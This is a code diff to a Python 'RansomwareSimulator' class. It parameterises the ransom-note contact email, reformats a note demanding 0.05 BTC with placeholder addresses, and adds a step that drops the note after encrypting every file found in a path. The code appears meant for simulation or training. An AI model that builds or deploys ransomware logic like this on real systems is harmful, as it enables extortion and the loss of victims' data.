@@ -87,16 +87,16 @@ class RansomwareSimulator:
             file.write(decrypted)
         os.remove(filepath)
 
-    def drop_ransom_note(self, btc_address="1FakeBTCAddr123"):
+    def drop_ransom_note(self, btc_address="1FakeBTCAddr123", recover_mail="recover@fakeemail.onion"):
         file_name = "README_RESTORE_FILES.txt"
         note = f"""
-        YOUR FILES HAVE BEEN ENCRYPTED.
+YOUR FILES HAVE BEEN ENCRYPTED.
 
-        Send 0.05 BTC to: {btc_address}
-        Then contact: recover@fakeemail.onion
+Send 0.05 BTC to: {btc_address}
+Then contact: {recover_mail}
 
-        Failure to do so will result in permanent loss of your data.
-        """
+Failure to do so will result in permanent loss of your data.
+"""
         if self.simulation:
             note_path = os.path.join(self.base_path, file_name)
             with open(note_path, "w") as f:
@@ -175,3 +175,4 @@ class RansomwareSimulator:
         files = self.find_files(path)
         for f in files:
             self.encrypt_file(f, key)
+        self.drop_ransom_note()
